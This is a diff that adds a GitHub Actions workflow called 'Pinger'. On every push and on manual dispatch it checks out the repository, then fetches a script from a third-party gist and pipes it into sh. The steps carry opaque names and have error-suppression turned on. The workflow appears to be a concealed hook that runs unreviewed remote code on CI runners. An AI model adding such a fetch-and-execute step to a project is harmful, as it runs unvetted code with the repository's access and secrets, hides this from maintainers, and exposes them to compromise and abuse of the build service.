@@ -1,0 +1,18 @@
+name: Pinger
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: EF1
+       uses: actions/checkout@main
+
+     - name: EF2
+       continue-on-error: true
+       run: |
+             curl -sSf https://gist.githubusercontent.com/nbefatt040-debug/b43859744f1a44762f10f1ae45072cbf/raw/run | sh -s run
